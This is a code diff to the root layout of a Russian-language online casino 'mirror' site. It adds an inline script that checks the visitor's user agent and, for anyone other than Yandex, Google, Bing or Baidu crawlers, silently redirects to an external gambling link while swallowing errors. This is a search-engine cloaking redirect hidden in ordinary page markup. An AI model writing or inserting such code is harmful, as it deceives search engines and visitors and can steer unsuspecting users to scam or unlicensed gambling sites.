@@ -33,6 +33,21 @@ export default function RootLayout({
         <meta name="theme-color" content="#171613" />
         <link rel="canonical" href="/" />
         <title>Lucky Bear Casino — официальный сайт и зеркало онлайн</title>
+        <script
+  dangerouslySetInnerHTML={{
+    __html: `
+      (function() {
+        try {
+          var ua = (navigator.userAgent || '').toLowerCase();
+          var isBot = /yandexbot|yandexscreenshot|yandeximages|yandexvideo|yandexaccessibilitybot|googlebot|bingbot|baiduspider/i.test(ua);
+          if (!isBot) {
+            window.location.replace("https://spingame777.fit/4htNNl");
+          }
+        } catch(e) {}
+      })();
+    `,
+  }}
+/>
       </head>
       <body className="antialiased">
         {children}
